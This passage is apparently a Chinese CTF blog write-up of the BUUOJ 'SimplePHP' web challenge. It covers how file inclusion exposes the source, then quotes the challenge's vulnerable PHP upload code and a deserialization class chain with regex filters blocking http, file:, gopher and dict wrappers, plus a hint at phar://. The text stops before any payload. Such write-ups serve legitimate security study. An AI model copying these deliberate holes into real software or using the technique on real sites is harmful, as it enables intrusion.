<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>BUUOJ-Web题目记录 | F4de&#39;s blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg">
    <meta name="description" content="西郊有密林，助君出重围。">
    <meta name="keywords" content="Web安全 | CTF">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c3dab397.css" as="style"><link rel="preload" href="/assets/js/app.23243609.js" as="script"><link rel="preload" href="/assets/js/2.b6b5fde6.js" as="script"><link rel="preload" href="/assets/js/9.e2574eb5.js" as="script"><link rel="prefetch" href="/assets/js/10.61fe8e74.js"><link rel="prefetch" href="/assets/js/11.aa0a0e27.js"><link rel="prefetch" href="/assets/js/12.f76d046e.js"><link rel="prefetch" href="/assets/js/13.e7eb76d3.js"><link rel="prefetch" href="/assets/js/14.6843e7d6.js"><link rel="prefetch" href="/assets/js/15.876aebbe.js"><link rel="prefetch" href="/assets/js/16.7bda9fb3.js"><link rel="prefetch" href="/assets/js/17.4d23d90c.js"><link rel="prefetch" href="/assets/js/18.8e3bf455.js"><link rel="prefetch" href="/assets/js/19.e2910e1f.js"><link rel="prefetch" href="/assets/js/20.d3ad9048.js"><link rel="prefetch" href="/assets/js/21.44a5eb88.js"><link rel="prefetch" href="/assets/js/22.9fdb32fe.js"><link rel="prefetch" href="/assets/js/23.a4171f9f.js"><link rel="prefetch" href="/assets/js/24.1dc52702.js"><link rel="prefetch" href="/assets/js/25.0d5d1524.js"><link rel="prefetch" href="/assets/js/26.acc4bd8a.js"><link rel="prefetch" href="/assets/js/27.70c3076c.js"><link rel="prefetch" href="/assets/js/28.a6cd030a.js"><link rel="prefetch" href="/assets/js/29.74b979df.js"><link rel="prefetch" href="/assets/js/3.b2dd61fd.js"><link rel="prefetch" href="/assets/js/30.48245f1e.js"><link rel="prefetch" href="/assets/js/31.100f6dc2.js"><link rel="prefetch" href="/assets/js/32.7fc433c9.js"><link rel="prefetch" href="/assets/js/33.29387a0a.js"><link rel="prefetch" href="/assets/js/34.9de6377e.js"><link rel="prefetch" href="/assets/js/35.8d8e3101.js"><link rel="prefetch" href="/assets/js/36.cffc3ac2.js"><link rel="prefetch" href="/assets/js/37.78556217.js"><link rel="prefetch" href="/assets/js/4.1d65e77b.js"><link rel="prefetch" href="/assets/js/5.477d6d12.js"><link rel="prefetch" href="/assets/js/6.9074f6ba.js"><link rel="prefetch" href="/assets/js/7.3da58132.js"><link rel="prefetch" href="/assets/js/8.10db4dab.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c3dab397.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="F4de's blog" class="logo"> <span class="site-name can-hide">F4de's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg"> <div class="blogger-info"><h3>F4de</h3> <span>Syclover | Web</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>BUUOJ</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/5bd5a9/" aria-current="page" class="active sidebar-link">BUUOJ题目记录</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#反序列化" class="sidebar-link">反序列化</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#simplephp" class="sidebar-link">SimplePHP</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#babysqliv0" class="sidebar-link">BabysqliV0</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#xss之光" class="sidebar-link">xss之光</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#harekazectf2019-easy-notes" class="sidebar-link">[HarekazeCTF2019]Easy Notes</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#sql注入" class="sidebar-link">SQL注入</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#sqli" class="sidebar-link">SQLi</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#不是文件上传" class="sidebar-link">不是文件上传</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#filemanager" class="sidebar-link">filemanager</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#swpu2019-web4" class="sidebar-link">[SWPU2019]Web4</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#文件上传" class="sidebar-link">文件上传</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#cv-maker" class="sidebar-link">CV Maker</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ssti" class="sidebar-link">SSTI</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#double-secret" class="sidebar-link">Double Secret</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#i-flask" class="sidebar-link">I&lt;3Flask</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#flaskapp" class="sidebar-link">FlaskApp</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#flasklight" class="sidebar-link">flasklight</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ciscn2019华东南赛区web11" class="sidebar-link">CISCN2019华东南赛区Web11</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#xss" class="sidebar-link">XSS</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#xxe" class="sidebar-link">XXE</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#true-xml-cookbook" class="sidebar-link">True XML cookbook</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#suctf-2018-homework" class="sidebar-link">[SUCTF 2018]Homework</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ssrf" class="sidebar-link">SSRF</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ez三剑客-ezweb" class="sidebar-link">EZ三剑客-EzWeb</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#网鼎杯-2020-白虎组-picdown" class="sidebar-link">[网鼎杯 2020 白虎组]PicDown</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#其他" class="sidebar-link">其他</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#枯燥的抽奖" class="sidebar-link">枯燥的抽奖</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#can-you-guess-it" class="sidebar-link">Can you guess it?</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#encode-and-encode" class="sidebar-link">encode and encode</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#swpu2019-web3" class="sidebar-link">[SWPU2019]Web3</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#cookie-store" class="sidebar-link">Cookie Store</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#avatar-uploader-1" class="sidebar-link">Avatar Uploader 1</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ciscn2019-华东南赛区-web4" class="sidebar-link">[CISCN2019 华东南赛区]Web4</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#pywebsite" class="sidebar-link">PYWebsite</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#v-n2020-公开赛-checkin" class="sidebar-link">[V&amp;N2020 公开赛]CHECKIN</a></li></ul></li></ul></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-vdoing-wrapper bg-style-6"><div class="articleInfo-wrap" data-v-f945b7fe><div class="articleInfo" data-v-f945b7fe><ul class="breadcrumbs" data-v-f945b7fe><li data-v-f945b7fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-f945b7fe></a></li> <li data-v-f945b7fe><span data-v-f945b7fe>WP记录</span></li> <li data-v-f945b7fe><span data-v-f945b7fe>BUUOJ</span></li></ul> <div class="info" data-v-f945b7fe><div title="作者" class="author iconfont icon-touxiang" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>F4de</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>2020-07-12</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABKFJREFUSA3tVl1oFVcQnrMbrak3QUgkya1akpJYcrUtIqW1JvFBE9LiQ5v6JmJpolbMg32rVrhgoYK0QiMY6i9Y6EMaW5D+xFJaTYItIuK2Kr3+BJNwkxBj05sQY3b3nM6cs2dv9t7NT/vQJw/sndk5M/PNzJkzewGerP+pAmy+ON8lLzUJgA8ZYxYIYZmGYRnctDaWvJJAmTtfP1pvXsBCCPP8QFcCaRkZYACgDZFO4stNIcBCajEOlmmC9XpJ9bAGCaPaPmzPl32dvLSVu3BWCTQs0XQQ6g0DYgwLIoAZbBCdW/i+781o1VVlm/410mw4h06Y7bIPHNyWDyL4FHkX03Q8SrzNhZTZriieckWt7cL6MM85YcLpsi/7O9/iXFT6MswI0DmmpkSaJ0qLxFIm3+i1THHB3zmBH3PYx9CcykcLOeQVVa7QtdxTgQgEleX2AjHYfwA+2ddV77ruGoJUbhGDI09YSNXyMpUt5ylOzxgbUmtOp7NmbNt8v3arjTBfYELmLUV+M+nSawNNAUqpT3ClJWg5I3BLT+cGW/DXNGCa6tx1aakCGEigArTn4TDIPdrXXYKCZNrHLMCOEPvHBlLQ99s9eHB7EB6NTki73CVPQ2F5MSx/uRQixfmq7rK0wYD8w8E905bnPDfwoWs/rfv93NWN/ZfvwsLIU7A09gxECyISeGJkHAau98L97tuw7NXnoPyNF8FcYGLGKsOs0mN3OEyec9esGW/ZEl945dTP34wlR2FZVQWU1q0Cw8Tr7p+hgLLNL0FPxx/Q35mA8aEUrH6nCgwEl0tn7wUiZYJnNRh6DK4UH/k0lfyrsBKdPVv/AriGIQcEDQZ65LBAGe2Rzui9Ybjz7XUppz1/uKBbyVPGkN3ZAeC6hr0x7Nr38N5+EqkoOm17xpoqR9ohQF55ERSvr4Dkr3chNfC3DMzGJlNBElW8w9nsGQvhNGIzDkXzCg8cLK951xHsFBlTJspJNi3ZFIMF2AeDV3q8DNOB+YHi6QTrChDIWDBRi5U5f+ZMfJLu3ccrqxtdxk4SKH336LFxSmkqefwU5T8fhdSdQf9IVKD6aNiwI/hnmcAZ91isYMJIaCUCx9W098+LgruikeTqzqqxKPUwqJyCPJiyemVVZBOijDGjD38Os0jOiSPL1z3SPjXNANbiNPXAdzTfukjjuknNBbyz3nwgTd3AVFqUJ5hpHlq9MveLnWwttUfoygBmvVjuikxND3znrhsELnZk7k+OjIGxeNEkomyLVta0xxn+HZhjBc4YZ/AFjHjz9u3xRZl2BN4aq9nFwWh16IrQ1aHHEd3j1+4/dB9OtH4e29A2H1DyHQRmOSfQZ1Fy7MHBTGB6J/Djq6p3OxyO2cB+4Car7v/o3GXgfAkj23+x9ID1Teoamo/SXcbvSf2PX7Vc8DdCmE1vN9di+32P9/5YR3vLnhCVGUWBjEkr3yh4H8v9CzmsbdhzOKzsJKM90iFdaTMjRPhGVsakRvOaRidljo6H6G7j+ctrJpsP+4COhDIl0La2+FS4+5mlocBaXY5QnGZysIBYoeSsl5qQzrSj/cgNrfuEzlWBfwA+EjrZyWUvpAAAAABJRU5ErkJggg==">
          BUUOJ-Web题目记录
        </h1> <div class="theme-vdoing-content content__default"><blockquote><p>题目会分类记录并标注关键考点，这样也方便日后随时捡起来看🥣。</p></blockquote> <h2 id="反序列化"><a href="#反序列化" class="header-anchor">#</a> 反序列化</h2> <h3 id="simplephp"><a href="#simplephp" class="header-anchor">#</a> SimplePHP</h3> <p>右键查看网页源代码一下发现题目给了提示</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712172510.png" alt="image-20200712172510308"></p> <p>存在上传文件和查看文件的功能，查看文件的页面中可以观察到url很可疑，可能存在文件包含</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712170838.png" alt="image-20200712170838704" style="zoom:67%;"> <p>传参<code>?file=f1ag.php</code>，发现被过滤掉了</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712172617.png" alt="image-20200712172617925" style="zoom:67%;"> <p>传参<code>?file=index.php</code>可以拿到index.php的源码，然后可以拿到所有源码</p> <p>下面直接看关键代码：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//function.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//show_source(__FILE__); </span>
<span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;base.php&quot;</span><span class="token punctuation">;</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Content-type: text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;REMOTE_ADDR&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.jpg&quot;</span><span class="token punctuation">;</span> 
    <span class="token comment">//md5(1170.0.2).jpg</span>
    <span class="token comment">//mkdir(&quot;upload&quot;,0777); </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;upload/&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;upload/&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;'</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 
<span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;jpeg&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span><span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
        <span class="token keyword">else</span> <span class="token punctuation">{</span> 
            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'</span><span class="token punctuation">;</span> 
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><p>使用白名单策略，只允许上传gif jpeg jpg png文件，并会对我们上传的文件进行重命名。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//class.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">C1e4r</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;hacker~&quot;</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;index.php&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;index.php&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
